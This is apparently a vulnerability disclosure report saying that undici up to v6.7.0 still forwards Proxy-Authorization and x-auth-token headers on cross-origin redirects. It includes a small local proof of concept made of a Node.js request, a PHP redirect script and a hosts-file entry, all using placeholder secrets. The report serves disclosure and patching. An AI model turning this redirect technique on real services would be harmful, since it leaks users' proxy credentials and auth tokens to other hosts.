MenuMenuSummary:: Undici already cleared Authorization and Cookie headers on cross-origin redirects, but did not clear Proxy-Authorization and x-auth-token headers.
Description:
Like https://github.com/nodejs/undici/security/advisories/GHSA-3787-6prv-h9w3, this is a fixed security issue in v5.28.3, v6.6.1, but I have tested the new version(v6.7.0) and it has not been fixed yet.
Steps To Reproduce:
POC:
Code 494 BytesUnwrap lines Copy Download1var undici = require('undici');
2
3const {
4    statusCode,
5    headers,
6    trailers,
7    body
8} = undici.request({
9    method: 'GET',
10    maxRedirections: 1,
11    origin: "http://127.0.0.1/", 
12    pathname: "",
13    headers: {
14        'content-type': 'application/json',
15        'Cookie': 'secret Cookie',
16        'Authorization': 'secret Authorization',
17        'Proxy-Authorization': 'secret Proxy-Authorization',
18        'x-auth-token': 'secret x-auth-token',
19        'Host': 'test.cn'
20    }
21})
The http://127.0.0.1/ is a redirect server. Sourcecode:
Code 47 BytesUnwrap lines Copy Download1<?php
2header("Location: http://a.com:2333");
3?>
Add the 1 record in the /etc/hosts file:
Code 17 BytesUnwrap lines Copy Download1127.0.0.1   a.com
Listening on port 2333 and discovering that Proxy-Authorization headers has been passed.
Impact:
<=undici@6.7.0
